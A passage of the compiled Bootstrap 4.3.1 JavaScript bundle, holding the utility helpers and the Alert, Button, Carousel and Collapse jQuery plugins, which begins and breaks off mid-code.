function getSpecialTransitionEndEvent() {    return {      bindType: TRANSITION_END,      delegateType: TRANSITION_END,      handle: function handle(event) {        if ($(event.target).is(this)) {          return event.handleObj.handler.apply(this, arguments); // eslint-disable-line prefer-rest-params        }        return undefined; // eslint-disable-line no-undefined      }    };  }  function transitionEndEmulator(duration) {    var _this = this;    var called = false;    $(this).one(Util.TRANSITION_END, function () {      called = true;    });    setTimeout(function () {      if (!called) {        Util.triggerTransitionEnd(_this);      }    }, duration);    return this;  }  function setTransitionEndSupport() {    $.fn.emulateTransitionEnd = transitionEndEmulator;    $.event.special[Util.TRANSITION_END] = getSpecialTransitionEndEvent();  }  /**   * --------------------------------------------------------------------------   * Public Util Api   * --------------------------------------------------------------------------   */  var Util = {    TRANSITION_END: 'bsTransitionEnd',    getUID: function getUID(prefix) {      do {        // eslint-disable-next-line no-bitwise        prefix += ~~(Math.random() * MAX_UID); // "~~" acts like a faster Math.floor() here      } while (document.getElementById(prefix));      return prefix;    },    getSelectorFromElement: function getSelectorFromElement(element) {      var selector = element.getAttribute('data-target');      if (!selector || selector === '#') {        var hrefAttr = element.getAttribute('href');        selector = hrefAttr && hrefAttr !== '#' ? hrefAttr.trim() : '';      }      try {        return document.querySelector(selector) ? selector : null;      } catch (err) {        return null;      }    },    getTransitionDurationFromElement: function getTransitionDurationFromElement(element) {      if (!element) {        return 0;      } // Get transition-duration of the element      var transitionDuration = $(element).css('transition-duration');      var transitionDelay = $(element).css('transition-delay');      var floatTransitionDuration = parseFloat(transitionDuration);      var floatTransitionDelay = parseFloat(transitionDelay); // Return 0 if element or transition duration is not found      if (!floatTransitionDuration && !floatTransitionDelay) {        return 0;      } // If multiple durations are defined, take the first      transitionDuration = transitionDuration.split(',')[0];      transitionDelay = transitionDelay.split(',')[0];      return (parseFloat(transitionDuration) + parseFloat(transitionDelay)) * MILLISECONDS_MULTIPLIER;    },    reflow: function reflow(element) {      return element.offsetHeight;    },    triggerTransitionEnd: function triggerTransitionEnd(element) {      $(element).trigger(TRANSITION_END);    },    // TODO: Remove in v5    supportsTransitionEnd: function supportsTransitionEnd() {      return Boolean(TRANSITION_END);    },    isElement: function isElement(obj) {      return (obj[0] || obj).nodeType;    },    typeCheckConfig: function typeCheckConfig(componentName, config, configTypes) {      for (var property in configTypes) {        if (Object.prototype.hasOwnProperty.call(configTypes, property)) {          var expectedTypes = configTypes[property];          var value = config[property];          var valueType = value && Util.isElement(value) ? 'element' : toType(value);          if (!new RegExp(expectedTypes).test(valueType)) {            throw new Error(componentName.toUpperCase() + ": " + ("Option \"" + property + "\" provided type \"" + valueType + "\" ") + ("but expected type \"" + expectedTypes + "\"."));          }        }      }    },    findShadowRoot: function findShadowRoot(element) {      if (!document.documentElement.attachShadow) {        return null;      } // Can find the shadow root otherwise it'll return the document      if (typeof element.getRootNode === 'function') {        var root = element.getRootNode();        return root instanceof ShadowRoot ? root : null;      }      if (element instanceof ShadowRoot) {        return element;      } // when we don't find a shadow root      if (!element.parentNode) {        return null;      }      return Util.findShadowRoot(element.parentNode);    }  };  setTransitionEndSupport();  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME = 'alert';  var VERSION = '4.3.1';  var DATA_KEY = 'bs.alert';  var EVENT_KEY = "." + DATA_KEY;  var DATA_API_KEY = '.data-api';  var JQUERY_NO_CONFLICT = $.fn[NAME];  var Selector = {    DISMISS: '[data-dismiss="alert"]'  };  var Event = {    CLOSE: "close" + EVENT_KEY,    CLOSED: "closed" + EVENT_KEY,    CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY  };  var ClassName = {    ALERT: 'alert',    FADE: 'fade',    SHOW: 'show'    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Alert =    /*#__PURE__*/    function () {      function Alert(element) {        this._element = element;      } // Getters      var _proto = Alert.prototype;      // Public      _proto.close = function close(element) {        var rootElement = this._element;        if (element) {          rootElement = this._getRootElement(element);        }        var customEvent = this._triggerCloseEvent(rootElement);        if (customEvent.isDefaultPrevented()) {          return;        }        this._removeElement(rootElement);      };      _proto.dispose = function dispose() {        $.removeData(this._element, DATA_KEY);        this._element = null;      } // Private        ;      _proto._getRootElement = function _getRootElement(element) {        var selector = Util.getSelectorFromElement(element);        var parent = false;        if (selector) {          parent = document.querySelector(selector);        }        if (!parent) {          parent = $(element).closest("." + ClassName.ALERT)[0];        }        return parent;      };      _proto._triggerCloseEvent = function _triggerCloseEvent(element) {        var closeEvent = $.Event(Event.CLOSE);        $(element).trigger(closeEvent);        return closeEvent;      };      _proto._removeElement = function _removeElement(element) {        var _this = this;        $(element).removeClass(ClassName.SHOW);        if (!$(element).hasClass(ClassName.FADE)) {          this._destroyElement(element);          return;        }        var transitionDuration = Util.getTransitionDurationFromElement(element);        $(element).one(Util.TRANSITION_END, function (event) {          return _this._destroyElement(element, event);        }).emulateTransitionEnd(transitionDuration);      };      _proto._destroyElement = function _destroyElement(element) {        $(element).detach().trigger(Event.CLOSED).remove();      } // Static        ;      Alert._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var $element = $(this);          var data = $element.data(DATA_KEY);          if (!data) {            data = new Alert(this);            $element.data(DATA_KEY, data);          }          if (config === 'close') {            data[config](this);          }        });      };      Alert._handleDismiss = function _handleDismiss(alertInstance) {        return function (event) {          if (event) {            event.preventDefault();          }          alertInstance.close(this);        };      };      _createClass(Alert, null, [{        key: "VERSION",        get: function get() {          return VERSION;        }      }]);      return Alert;    }();  /**   * ------------------------------------------------------------------------   * Data Api implementation   * ------------------------------------------------------------------------   */  $(document).on(Event.CLICK_DATA_API, Selector.DISMISS, Alert._handleDismiss(new Alert()));  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME] = Alert._jQueryInterface;  $.fn[NAME].Constructor = Alert;  $.fn[NAME].noConflict = function () {    $.fn[NAME] = JQUERY_NO_CONFLICT;    return Alert._jQueryInterface;  };  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$1 = 'button';  var VERSION$1 = '4.3.1';  var DATA_KEY$1 = 'bs.button';  var EVENT_KEY$1 = "." + DATA_KEY$1;  var DATA_API_KEY$1 = '.data-api';  var JQUERY_NO_CONFLICT$1 = $.fn[NAME$1];  var ClassName$1 = {    ACTIVE: 'active',    BUTTON: 'btn',    FOCUS: 'focus'  };  var Selector$1 = {    DATA_TOGGLE_CARROT: '[data-toggle^="button"]',    DATA_TOGGLE: '[data-toggle="buttons"]',    INPUT: 'input:not([type="hidden"])',    ACTIVE: '.active',    BUTTON: '.btn'  };  var Event$1 = {    CLICK_DATA_API: "click" + EVENT_KEY$1 + DATA_API_KEY$1,    FOCUS_BLUR_DATA_API: "focus" + EVENT_KEY$1 + DATA_API_KEY$1 + " " + ("blur" + EVENT_KEY$1 + DATA_API_KEY$1)    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Button =    /*#__PURE__*/    function () {      function Button(element) {        this._element = element;      } // Getters      var _proto = Button.prototype;      // Public      _proto.toggle = function toggle() {        var triggerChangeEvent = true;        var addAriaPressed = true;        var rootElement = $(this._element).closest(Selector$1.DATA_TOGGLE)[0];        if (rootElement) {          var input = this._element.querySelector(Selector$1.INPUT);          if (input) {            if (input.type === 'radio') {              if (input.checked && this._element.classList.contains(ClassName$1.ACTIVE)) {                triggerChangeEvent = false;              } else {                var activeElement = rootElement.querySelector(Selector$1.ACTIVE);                if (activeElement) {                  $(activeElement).removeClass(ClassName$1.ACTIVE);                }              }            }            if (triggerChangeEvent) {              if (input.hasAttribute('disabled') || rootElement.hasAttribute('disabled') || input.classList.contains('disabled') || rootElement.classList.contains('disabled')) {                return;              }              input.checked = !this._element.classList.contains(ClassName$1.ACTIVE);              $(input).trigger('change');            }            input.focus();            addAriaPressed = false;          }        }        if (addAriaPressed) {          this._element.setAttribute('aria-pressed', !this._element.classList.contains(ClassName$1.ACTIVE));        }        if (triggerChangeEvent) {          $(this._element).toggleClass(ClassName$1.ACTIVE);        }      };      _proto.dispose = function dispose() {        $.removeData(this._element, DATA_KEY$1);        this._element = null;      } // Static        ;      Button._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var data = $(this).data(DATA_KEY$1);          if (!data) {            data = new Button(this);            $(this).data(DATA_KEY$1, data);          }          if (config === 'toggle') {            data[config]();          }        });      };      _createClass(Button, null, [{        key: "VERSION",        get: function get() {          return VERSION$1;        }      }]);      return Button;    }();  /**   * ------------------------------------------------------------------------   * Data Api implementation   * ------------------------------------------------------------------------   */  $(document).on(Event$1.CLICK_DATA_API, Selector$1.DATA_TOGGLE_CARROT, function (event) {    event.preventDefault();    var button = event.target;    if (!$(button).hasClass(ClassName$1.BUTTON)) {      button = $(button).closest(Selector$1.BUTTON);    }    Button._jQueryInterface.call($(button), 'toggle');  }).on(Event$1.FOCUS_BLUR_DATA_API, Selector$1.DATA_TOGGLE_CARROT, function (event) {    var button = $(event.target).closest(Selector$1.BUTTON)[0];    $(button).toggleClass(ClassName$1.FOCUS, /^focus(in)?$/.test(event.type));  });  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$1] = Button._jQueryInterface;  $.fn[NAME$1].Constructor = Button;  $.fn[NAME$1].noConflict = function () {    $.fn[NAME$1] = JQUERY_NO_CONFLICT$1;    return Button._jQueryInterface;  };  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$2 = 'carousel';  var VERSION$2 = '4.3.1';  var DATA_KEY$2 = 'bs.carousel';  var EVENT_KEY$2 = "." + DATA_KEY$2;  var DATA_API_KEY$2 = '.data-api';  var JQUERY_NO_CONFLICT$2 = $.fn[NAME$2];  var ARROW_LEFT_KEYCODE = 37; // KeyboardEvent.which value for left arrow key  var ARROW_RIGHT_KEYCODE = 39; // KeyboardEvent.which value for right arrow key  var TOUCHEVENT_COMPAT_WAIT = 500; // Time for mouse compat events to fire after touch  var SWIPE_THRESHOLD = 40;  var Default = {    interval: 5000,    keyboard: true,    slide: false,    pause: 'hover',    wrap: true,    touch: true  };  var DefaultType = {    interval: '(number|boolean)',    keyboard: 'boolean',    slide: '(boolean|string)',    pause: '(string|boolean)',    wrap: 'boolean',    touch: 'boolean'  };  var Direction = {    NEXT: 'next',    PREV: 'prev',    LEFT: 'left',    RIGHT: 'right'  };  var Event$2 = {    SLIDE: "slide" + EVENT_KEY$2,    SLID: "slid" + EVENT_KEY$2,    KEYDOWN: "keydown" + EVENT_KEY$2,    MOUSEENTER: "mouseenter" + EVENT_KEY$2,    MOUSELEAVE: "mouseleave" + EVENT_KEY$2,    TOUCHSTART: "touchstart" + EVENT_KEY$2,    TOUCHMOVE: "touchmove" + EVENT_KEY$2,    TOUCHEND: "touchend" + EVENT_KEY$2,    POINTERDOWN: "pointerdown" + EVENT_KEY$2,    POINTERUP: "pointerup" + EVENT_KEY$2,    DRAG_START: "dragstart" + EVENT_KEY$2,    LOAD_DATA_API: "load" + EVENT_KEY$2 + DATA_API_KEY$2,    CLICK_DATA_API: "click" + EVENT_KEY$2 + DATA_API_KEY$2  };  var ClassName$2 = {    CAROUSEL: 'carousel',    ACTIVE: 'active',    SLIDE: 'slide',    RIGHT: 'carousel-item-right',    LEFT: 'carousel-item-left',    NEXT: 'carousel-item-next',    PREV: 'carousel-item-prev',    ITEM: 'carousel-item',    POINTER_EVENT: 'pointer-event'  };  var Selector$2 = {    ACTIVE: '.active',    ACTIVE_ITEM: '.active.carousel-item',    ITEM: '.carousel-item',    ITEM_IMG: '.carousel-item img',    NEXT_PREV: '.carousel-item-next, .carousel-item-prev',    INDICATORS: '.carousel-indicators',    DATA_SLIDE: '[data-slide], [data-slide-to]',    DATA_RIDE: '[data-ride="carousel"]'  };  var PointerType = {    TOUCH: 'touch',    PEN: 'pen'    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Carousel =    /*#__PURE__*/    function () {      function Carousel(element, config) {        this._items = null;        this._interval = null;        this._activeElement = null;        this._isPaused = false;        this._isSliding = false;        this.touchTimeout = null;        this.touchStartX = 0;        this.touchDeltaX = 0;        this._config = this._getConfig(config);        this._element = element;        this._indicatorsElement = this._element.querySelector(Selector$2.INDICATORS);        this._touchSupported = 'ontouchstart' in document.documentElement || navigator.maxTouchPoints > 0;        this._pointerEvent = Boolean(window.PointerEvent || window.MSPointerEvent);        this._addEventListeners();      } // Getters      var _proto = Carousel.prototype;      // Public      _proto.next = function next() {        if (!this._isSliding) {          this._slide(Direction.NEXT);        }      };      _proto.nextWhenVisible = function nextWhenVisible() {        // Don't call next when the page isn't visible        // or the carousel or its parent isn't visible        if (!document.hidden && $(this._element).is(':visible') && $(this._element).css('visibility') !== 'hidden') {          this.next();        }      };      _proto.prev = function prev() {        if (!this._isSliding) {          this._slide(Direction.PREV);        }      };      _proto.pause = function pause(event) {        if (!event) {          this._isPaused = true;        }        if (this._element.querySelector(Selector$2.NEXT_PREV)) {          Util.triggerTransitionEnd(this._element);          this.cycle(true);        }        clearInterval(this._interval);        this._interval = null;      };      _proto.cycle = function cycle(event) {        if (!event) {          this._isPaused = false;        }        if (this._interval) {          clearInterval(this._interval);          this._interval = null;        }        if (this._config.interval && !this._isPaused) {          this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval);        }      };      _proto.to = function to(index) {        var _this = this;        this._activeElement = this._element.querySelector(Selector$2.ACTIVE_ITEM);        var activeIndex = this._getItemIndex(this._activeElement);        if (index > this._items.length - 1 || index < 0) {          return;        }        if (this._isSliding) {          $(this._element).one(Event$2.SLID, function () {            return _this.to(index);          });          return;        }        if (activeIndex === index) {          this.pause();          this.cycle();          return;        }        var direction = index > activeIndex ? Direction.NEXT : Direction.PREV;        this._slide(direction, this._items[index]);      };      _proto.dispose = function dispose() {        $(this._element).off(EVENT_KEY$2);        $.removeData(this._element, DATA_KEY$2);        this._items = null;        this._config = null;        this._element = null;        this._interval = null;        this._isPaused = null;        this._isSliding = null;        this._activeElement = null;        this._indicatorsElement = null;      } // Private        ;      _proto._getConfig = function _getConfig(config) {        config = _objectSpread({}, Default, config);        Util.typeCheckConfig(NAME$2, config, DefaultType);        return config;      };      _proto._handleSwipe = function _handleSwipe() {        var absDeltax = Math.abs(this.touchDeltaX);        if (absDeltax <= SWIPE_THRESHOLD) {          return;        }        var direction = absDeltax / this.touchDeltaX; // swipe left        if (direction > 0) {          this.prev();        } // swipe right        if (direction < 0) {          this.next();        }      };      _proto._addEventListeners = function _addEventListeners() {        var _this2 = this;        if (this._config.keyboard) {          $(this._element).on(Event$2.KEYDOWN, function (event) {            return _this2._keydown(event);          });        }        if (this._config.pause === 'hover') {          $(this._element).on(Event$2.MOUSEENTER, function (event) {            return _this2.pause(event);          }).on(Event$2.MOUSELEAVE, function (event) {            return _this2.cycle(event);          });        }        if (this._config.touch) {          this._addTouchEventListeners();        }      };      _proto._addTouchEventListeners = function _addTouchEventListeners() {        var _this3 = this;        if (!this._touchSupported) {          return;        }        var start = function start(event) {          if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {            _this3.touchStartX = event.originalEvent.clientX;          } else if (!_this3._pointerEvent) {            _this3.touchStartX = event.originalEvent.touches[0].clientX;          }        };        var move = function move(event) {          // ensure swiping with one touch and not pinching          if (event.originalEvent.touches && event.originalEvent.touches.length > 1) {            _this3.touchDeltaX = 0;          } else {            _this3.touchDeltaX = event.originalEvent.touches[0].clientX - _this3.touchStartX;          }        };        var end = function end(event) {          if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {            _this3.touchDeltaX = event.originalEvent.clientX - _this3.touchStartX;          }          _this3._handleSwipe();          if (_this3._config.pause === 'hover') {            // If it's a touch-enabled device, mouseenter/leave are fired as            // part of the mouse compatibility events on first tap - the carousel            // would stop cycling until user tapped out of it;            // here, we listen for touchend, explicitly pause the carousel            // (as if it's the second time we tap on it, mouseenter compat event            // is NOT fired) and after a timeout (to allow for mouse compatibility            // events to fire) we explicitly restart cycling            _this3.pause();            if (_this3.touchTimeout) {              clearTimeout(_this3.touchTimeout);            }            _this3.touchTimeout = setTimeout(function (event) {              return _this3.cycle(event);            }, TOUCHEVENT_COMPAT_WAIT + _this3._config.interval);          }        };        $(this._element.querySelectorAll(Selector$2.ITEM_IMG)).on(Event$2.DRAG_START, function (e) {          return e.preventDefault();        });        if (this._pointerEvent) {          $(this._element).on(Event$2.POINTERDOWN, function (event) {            return start(event);          });          $(this._element).on(Event$2.POINTERUP, function (event) {            return end(event);          });          this._element.classList.add(ClassName$2.POINTER_EVENT);        } else {          $(this._element).on(Event$2.TOUCHSTART, function (event) {            return start(event);          });          $(this._element).on(Event$2.TOUCHMOVE, function (event) {            return move(event);          });          $(this._element).on(Event$2.TOUCHEND, function (event) {            return end(event);          });        }      };      _proto._keydown = function _keydown(event) {        if (/input|textarea/i.test(event.target.tagName)) {          return;        }        switch (event.which) {          case ARROW_LEFT_KEYCODE:            event.preventDefault();            this.prev();            break;          case ARROW_RIGHT_KEYCODE:            event.preventDefault();            this.next();            break;          default:        }      };      _proto._getItemIndex = function _getItemIndex(element) {        this._items = element && element.parentNode ? [].slice.call(element.parentNode.querySelectorAll(Selector$2.ITEM)) : [];        return this._items.indexOf(element);      };      _proto._getItemByDirection = function _getItemByDirection(direction, activeElement) {        var isNextDirection = direction === Direction.NEXT;        var isPrevDirection = direction === Direction.PREV;        var activeIndex = this._getItemIndex(activeElement);        var lastItemIndex = this._items.length - 1;        var isGoingToWrap = isPrevDirection && activeIndex === 0 || isNextDirection && activeIndex === lastItemIndex;        if (isGoingToWrap && !this._config.wrap) {          return activeElement;        }        var delta = direction === Direction.PREV ? -1 : 1;        var itemIndex = (activeIndex + delta) % this._items.length;        return itemIndex === -1 ? this._items[this._items.length - 1] : this._items[itemIndex];      };      _proto._triggerSlideEvent = function _triggerSlideEvent(relatedTarget, eventDirectionName) {        var targetIndex = this._getItemIndex(relatedTarget);        var fromIndex = this._getItemIndex(this._element.querySelector(Selector$2.ACTIVE_ITEM));        var slideEvent = $.Event(Event$2.SLIDE, {          relatedTarget: relatedTarget,          direction: eventDirectionName,          from: fromIndex,          to: targetIndex        });        $(this._element).trigger(slideEvent);        return slideEvent;      };      _proto._setActiveIndicatorElement = function _setActiveIndicatorElement(element) {        if (this._indicatorsElement) {          var indicators = [].slice.call(this._indicatorsElement.querySelectorAll(Selector$2.ACTIVE));          $(indicators).removeClass(ClassName$2.ACTIVE);          var nextIndicator = this._indicatorsElement.children[this._getItemIndex(element)];          if (nextIndicator) {            $(nextIndicator).addClass(ClassName$2.ACTIVE);          }        }      };      _proto._slide = function _slide(direction, element) {        var _this4 = this;        var activeElement = this._element.querySelector(Selector$2.ACTIVE_ITEM);        var activeElementIndex = this._getItemIndex(activeElement);        var nextElement = element || activeElement && this._getItemByDirection(direction, activeElement);        var nextElementIndex = this._getItemIndex(nextElement);        var isCycling = Boolean(this._interval);        var directionalClassName;        var orderClassName;        var eventDirectionName;        if (direction === Direction.NEXT) {          directionalClassName = ClassName$2.LEFT;          orderClassName = ClassName$2.NEXT;          eventDirectionName = Direction.LEFT;        } else {          directionalClassName = ClassName$2.RIGHT;          orderClassName = ClassName$2.PREV;          eventDirectionName = Direction.RIGHT;        }        if (nextElement && $(nextElement).hasClass(ClassName$2.ACTIVE)) {          this._isSliding = false;          return;        }        var slideEvent = this._triggerSlideEvent(nextElement, eventDirectionName);        if (slideEvent.isDefaultPrevented()) {          return;        }        if (!activeElement || !nextElement) {          // Some weirdness is happening, so we bail          return;        }        this._isSliding = true;        if (isCycling) {          this.pause();        }        this._setActiveIndicatorElement(nextElement);        var slidEvent = $.Event(Event$2.SLID, {          relatedTarget: nextElement,          direction: eventDirectionName,          from: activeElementIndex,          to: nextElementIndex        });        if ($(this._element).hasClass(ClassName$2.SLIDE)) {          $(nextElement).addClass(orderClassName);          Util.reflow(nextElement);          $(activeElement).addClass(directionalClassName);          $(nextElement).addClass(directionalClassName);          var nextElementInterval = parseInt(nextElement.getAttribute('data-interval'), 10);          if (nextElementInterval) {            this._config.defaultInterval = this._config.defaultInterval || this._config.interval;            this._config.interval = nextElementInterval;          } else {            this._config.interval = this._config.defaultInterval || this._config.interval;          }          var transitionDuration = Util.getTransitionDurationFromElement(activeElement);          $(activeElement).one(Util.TRANSITION_END, function () {            $(nextElement).removeClass(directionalClassName + " " + orderClassName).addClass(ClassName$2.ACTIVE);            $(activeElement).removeClass(ClassName$2.ACTIVE + " " + orderClassName + " " + directionalClassName);            _this4._isSliding = false;            setTimeout(function () {              return $(_this4._element).trigger(slidEvent);            }, 0);          }).emulateTransitionEnd(transitionDuration);        } else {          $(activeElement).removeClass(ClassName$2.ACTIVE);          $(nextElement).addClass(ClassName$2.ACTIVE);          this._isSliding = false;          $(this._element).trigger(slidEvent);        }        if (isCycling) {          this.cycle();        }      } // Static        ;      Carousel._jQueryInterface = function _jQueryInterface(config) {        return this.each(function () {          var data = $(this).data(DATA_KEY$2);          var _config = _objectSpread({}, Default, $(this).data());          if (typeof config === 'object') {            _config = _objectSpread({}, _config, config);          }          var action = typeof config === 'string' ? config : _config.slide;          if (!data) {            data = new Carousel(this, _config);            $(this).data(DATA_KEY$2, data);          }          if (typeof config === 'number') {            data.to(config);          } else if (typeof action === 'string') {            if (typeof data[action] === 'undefined') {              throw new TypeError("No method named \"" + action + "\"");            }            data[action]();          } else if (_config.interval && _config.ride) {            data.pause();            data.cycle();          }        });      };      Carousel._dataApiClickHandler = function _dataApiClickHandler(event) {        var selector = Util.getSelectorFromElement(this);        if (!selector) {          return;        }        var target = $(selector)[0];        if (!target || !$(target).hasClass(ClassName$2.CAROUSEL)) {          return;        }        var config = _objectSpread({}, $(target).data(), $(this).data());        var slideIndex = this.getAttribute('data-slide-to');        if (slideIndex) {          config.interval = false;        }        Carousel._jQueryInterface.call($(target), config);        if (slideIndex) {          $(target).data(DATA_KEY$2).to(slideIndex);        }        event.preventDefault();      };      _createClass(Carousel, null, [{        key: "VERSION",        get: function get() {          return VERSION$2;        }      }, {        key: "Default",        get: function get() {          return Default;        }      }]);      return Carousel;    }();  /**   * ------------------------------------------------------------------------   * Data Api implementation   * ------------------------------------------------------------------------   */  $(document).on(Event$2.CLICK_DATA_API, Selector$2.DATA_SLIDE, Carousel._dataApiClickHandler);  $(window).on(Event$2.LOAD_DATA_API, function () {    var carousels = [].slice.call(document.querySelectorAll(Selector$2.DATA_RIDE));    for (var i = 0, len = carousels.length; i < len; i++) {      var $carousel = $(carousels[i]);      Carousel._jQueryInterface.call($carousel, $carousel.data());    }  });  /**   * ------------------------------------------------------------------------   * jQuery   * ------------------------------------------------------------------------   */  $.fn[NAME$2] = Carousel._jQueryInterface;  $.fn[NAME$2].Constructor = Carousel;  $.fn[NAME$2].noConflict = function () {    $.fn[NAME$2] = JQUERY_NO_CONFLICT$2;    return Carousel._jQueryInterface;  };  /**   * ------------------------------------------------------------------------   * Constants   * ------------------------------------------------------------------------   */  var NAME$3 = 'collapse';  var VERSION$3 = '4.3.1';  var DATA_KEY$3 = 'bs.collapse';  var EVENT_KEY$3 = "." + DATA_KEY$3;  var DATA_API_KEY$3 = '.data-api';  var JQUERY_NO_CONFLICT$3 = $.fn[NAME$3];  var Default$1 = {    toggle: true,    parent: ''  };  var DefaultType$1 = {    toggle: 'boolean',    parent: '(string|element)'  };  var Event$3 = {    SHOW: "show" + EVENT_KEY$3,    SHOWN: "shown" + EVENT_KEY$3,    HIDE: "hide" + EVENT_KEY$3,    HIDDEN: "hidden" + EVENT_KEY$3,    CLICK_DATA_API: "click" + EVENT_KEY$3 + DATA_API_KEY$3  };  var ClassName$3 = {    SHOW: 'show',    COLLAPSE: 'collapse',    COLLAPSING: 'collapsing',    COLLAPSED: 'collapsed'  };  var Dimension = {    WIDTH: 'width',    HEIGHT: 'height'  };  var Selector$3 = {    ACTIVES: '.show, .collapsing',    DATA_TOGGLE: '[data-toggle="collapse"]'    /**     * ------------------------------------------------------------------------     * Class Definition     * ------------------------------------------------------------------------     */  };  var Collapse =    /*#__PURE__*/    function () {      function Collapse(element, config) {        this._isTransitioning = false;        this._element = element;        this._config = this._getConfig(config);        this._triggerArray = [].slice.call(document.querySelectorAll("[data-toggle=\"collapse\"][href=\"#" + element.id + "\"]," + ("[data-toggle=\"collapse\"][data-target=\"#" + element.id + "\"]")));        var toggleList = [].slice.call(document.querySelectorAll(Selector$3.DATA_TOGGLE));        for (var i = 0, len = toggleList.length; i < len; i++) {          var elem = toggleList[i];          var selector = Util.getSelectorFromElement(elem);          var filterElement = [].slice.call(document.querySelectorAll(selector)).filter(function (foundElem) {            return foundElem === element;          });          if (selector !== null && filterElement.length > 0) {            this._selector = selector;            this._triggerArray.push(elem);          }        }        this._parent = this._config.parent ? this._getParent() : null;        if (!this._config.parent) {          this._addAriaAndCollapsedClass(this._element, this._triggerArray);        }        if (this._config.toggle) {          this.toggle();        }      } // Getters      var _proto = Collapse.prototype;      // Public      _proto.toggle = function toggle() {        if ($(this._element).hasClass(ClassName$3.SHOW)) {          this.hide();        } else {          this.show();        }      };      _proto.show = function show() {        var _this = this;        if (this._isTransitioning || $(this._element).hasClass(ClassName$3.SHOW)) {          return;        }        var actives;        var activesData;        if (this._parent) {          actives = [].slice.call(this._parent.querySelectorAll(Selector$3.ACTIVES)).filter(function (elem) {            if (typeof _this._config.parent === 'string') {              return elem.getAttribute('data-parent') === _this._config.parent;            }            return elem.classList.contains(ClassName$3.COLLAPSE);          });          if (actives.length === 0) {            actives = null;          }        }        if (actives) {          activesData = $(actives).not(this._selector).data(DATA_KEY$3);          if (activesData && activesData._isTransitioning) {            return;          }        }        var startEvent = $.Event(Event$3.SHOW);        $(this._element).trigger(startEvent);        if (startEvent.isDefaultPrevented()) {          return;        }        if (actives) {          Collapse._jQueryInterface.call($(actives).not(this._selector), 'hide');          if (!activesData) {            $(actives).data(DATA_KEY$3, null);          }        }        var dimension = this._getDimension();        $(this._element).removeClass(ClassName$3.COLLAPSE).addClass(ClassName$3.COLLAPSING);        this._element.style[dimension] = 0;        if (this._triggerArray.length) {          $(this._triggerArray).removeClass(ClassName$3.COLLAPSED).attr('aria-expanded', true);        }        this.setTransitioning(true);        var complete = function complete() {          $(_this._element).removeClass(ClassName$3.COLLAPSING).addClass(ClassName$3.COLLAPSE).addClass(ClassName$3.SHOW);          _this._element.style[dimension] = '';          _this.setTransitioning(false);          $(_this._element).trigger(Event$3.SHOWN);        };        var capitalizedDimension = dimension[0].toUpperCase() + dimension.slice(1);        var scrollSize = "scroll" + capitalizedDimension;        var transitionDuration = Util.getTransitionDurationFromElement(this._element);        $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);        this._element.style[dimension] = this._element[scrollSize] + "px";      };      _proto.hide = function hide() {        var _this2 = this;        if (this._isTransitioning || !$(this._element).hasClass(ClassName$3.SHOW)) {          return;        }        var startEvent = $.Event(Event$3.HIDE);        $(this._element).trigger(startEvent);        if (startEvent.isDefaultPrevented()) {          return;        }        var dimension = this._getDimension();        this._element.style[dimension] = this._element.getBoundingClientRect()[dimension] + "px";        Util.reflow(this._element);        $(this._element).addClass(ClassName$3.COLLAPSING).removeClass(ClassName$3.COLLAPSE).removeClass(ClassName$3.SHOW);        var triggerArrayLength = this._triggerArray.length;        if (triggerArrayLength > 0) {          for (var i = 0; i < triggerArrayLength; i++) {            var trigger = this._triggerArray[i];            var selector = Util.getSelectorFromElement(trigger);            if (selector !== null) {              var $elem = $([].slice.call(document.querySelectorAll(selector)));              if (!$elem.hasClass(ClassName$3.SHOW)) {                $(trigger).addClass(ClassName$3.COLLAPSED).attr('aria-expanded', false);              }            }          }        }        this.setTransitioning(true);        var complete = function complete() {          _this2.setTransitioning(false);          $(_this2._element).removeClass(ClassName$3.COLLAPSING).addClass(ClassName$3.COLLAPSE).trigger(Event$3.HIDDEN);        };        this._element.style[dimension] = '';        var transitionDuration = Util.getTransitionDurationFromElement(this._element);        $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);      };      _proto.setTransitioning = function setTransitioning(isTransitioning) {        this._isTransitioning = isTransitioning;      };      _proto.dispose = function dispose() {        $.removeData(this._element, DATA_KEY$3);        this._config = null;        this._parent = null;        this._element = null;        this._triggerArray = null;        this._isTransitioning = null;      } // Private        ;      _proto._getConfig = function _getConfig(config) {        config = _objectSpread({}, Default$1, config);        config.toggle = Boolean(config.toggle); // Coerce string values        Util.typeCheckConfig(NAME$3, config, DefaultType$1);        return config;      };      _proto._getDimension = function _getDimension() {        var hasWidth = $(this._element).hasClass(Dimension.WIDTH);        return hasWidth ? Dimension.WIDTH : Dimension.HEIGHT;      };      _proto._getParent = function _getParent() {        var _this3 = this;        var parent;        if (Util.isElement(this._config.parent)) {          parent = this._config.parent; // It's a jQuery object          if (typeof this._config.parent.jquery !== 'undefined') {            parent = this._config.parent[0];          }        } else {          parent = document.querySelector(this._config.parent);        }        var selector = "[data-toggle=\"collapse\"][data-parent=\"" + this._config.parent + "\"]";        var children = [].slice.call(parent.querySelectorAll(selector));        $(children).each(function (i, element) {          _this3._addAriaAndCollapsedClass(Collapse._getTargetFromElement(element), [element]);        });        return parent;      };      _proto._addAriaAndCollapsedClass = function _addAriaAndCollapsedClass(element, triggerArray) {        var isOpen = $(element).hasClass(ClassName$3.SHOW);        if (triggerArray.length) {          $(triggerArray).toggleClass(ClassName$3.COLLAPSED, !isOpen).attr('aria-expanded', isOpen);        }      } // Static        ;      Collapse._getTargetFromElement = function _getTargetFromElement(element) {        var selector = 